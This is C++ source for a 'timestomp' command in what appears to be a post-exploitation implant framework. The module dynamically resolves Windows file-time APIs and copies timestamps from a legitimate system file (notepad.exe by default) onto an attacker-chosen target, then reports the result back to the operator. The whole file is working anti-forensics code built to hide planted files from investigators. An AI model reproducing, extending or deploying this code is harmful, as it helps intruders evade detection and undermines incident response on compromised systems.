#include <common.h>
#include <commands.h>
#include <package.h>
#include <parser.h>
#include <config.h>
#include <strings.h>

#ifdef INCLUDE_CMD_TIMESTOMP

using namespace stardust;
using namespace starburst;

typedef BOOL ( WINAPI *fn_GetFileTime )( HANDLE, LPFILETIME, LPFILETIME, LPFILETIME );
typedef BOOL ( WINAPI *fn_SetFileTime )( HANDLE, const FILETIME*, const FILETIME*, const FILETIME* );

auto declfn starburst::cmd_timestomp(
    _Inout_ instance& inst,
    _In_    char*     task_uuid,
    _In_    Parser*   params
) -> void {
    uint32_t target_len = 0;
    auto target_path = parser_string( params, &target_len );
    if ( !target_path || target_len == 0 ) {
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "no target path" ) ) );
        return;
    }

    uint32_t source_len = 0;
    auto source_path = parser_string( params, &source_len );

    // if no source, default to notepad.exe
    char default_source[48] = { 0 };
    if ( !source_path || source_len == 0 ) {
        str_copy( default_source,
            symbol<char*>( const_cast<char*>( "C:\\Windows\\System32\\notepad.exe" ) ) );
        source_path = default_source;
        source_len = str_len( default_source );
    }

    DBG_PRINT( inst, "cmd_timestomp: target_len=%u source_len=%u\n", target_len, source_len );

    auto k32 = inst.kernel32.handle;

    auto pGetFileTime = reinterpret_cast<fn_GetFileTime>(
        inst.kernel32.GetProcAddress( (HMODULE)k32,
            symbol<LPCSTR>( "GetFileTime" ) ) );
    auto pSetFileTime = reinterpret_cast<fn_SetFileTime>(
        inst.kernel32.GetProcAddress( (HMODULE)k32,
            symbol<LPCSTR>( "SetFileTime" ) ) );

    if ( !pGetFileTime || !pSetFileTime ) {
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "failed to resolve file time APIs" ) ) );
        return;
    }

    // convert source path to wide
    char src_buf[520] = { 0 };
    uint32_t src_copy = source_len < 519 ? source_len : 519;
    memory::copy( src_buf, source_path, src_copy );

    wchar_t wsrc[520] = { 0 };
    inst.kernel32.MultiByteToWideChar( CP_ACP, 0, src_buf, -1, wsrc, 520 );

    // open source file for reading timestamps
    HANDLE h_source = inst.kernel32.CreateFileW(
        wsrc, GENERIC_READ, FILE_SHARE_READ,
        nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr );

    if ( h_source == INVALID_HANDLE_VALUE ) {
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "failed to open source file" ) ) );
        return;
    }

    FILETIME ft_create = {};
    FILETIME ft_access = {};
    FILETIME ft_write  = {};

    if ( !pGetFileTime( h_source, &ft_create, &ft_access, &ft_write ) ) {
        inst.kernel32.CloseHandle( h_source );
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "GetFileTime failed on source" ) ) );
        return;
    }
    inst.kernel32.CloseHandle( h_source );

    // convert target path to wide
    char tgt_buf[520] = { 0 };
    uint32_t tgt_copy = target_len < 519 ? target_len : 519;
    memory::copy( tgt_buf, target_path, tgt_copy );

    wchar_t wtgt[520] = { 0 };
    inst.kernel32.MultiByteToWideChar( CP_ACP, 0, tgt_buf, -1, wtgt, 520 );

    // open target with FILE_WRITE_ATTRIBUTES
    HANDLE h_target = inst.kernel32.CreateFileW(
        wtgt, FILE_WRITE_ATTRIBUTES, FILE_SHARE_READ | FILE_SHARE_WRITE,
        nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr );

    if ( h_target == INVALID_HANDLE_VALUE ) {
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "failed to open target file" ) ) );
        return;
    }

    if ( !pSetFileTime( h_target, &ft_create, &ft_access, &ft_write ) ) {
        inst.kernel32.CloseHandle( h_target );
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "SetFileTime failed on target" ) ) );
        return;
    }

    inst.kernel32.CloseHandle( h_target );

    char msg[256] = { 0 };
    str_copy( msg, symbol<char*>( const_cast<char*>( "timestamps copied from " ) ) );
    uint32_t slen = str_len( src_buf );
    if ( slen > 100 ) slen = 100;
    memory::copy( msg + str_len( msg ), src_buf, slen );
    str_concat( msg, symbol<char*>( const_cast<char*>( " to " ) ) );
    uint32_t tlen = str_len( tgt_buf );
    if ( tlen > 100 ) tlen = 100;
    memory::copy( msg + str_len( msg ), tgt_buf, tlen );

    queue_response( inst, task_uuid, RESPONSE_SUCCESS, msg );
}

#endif
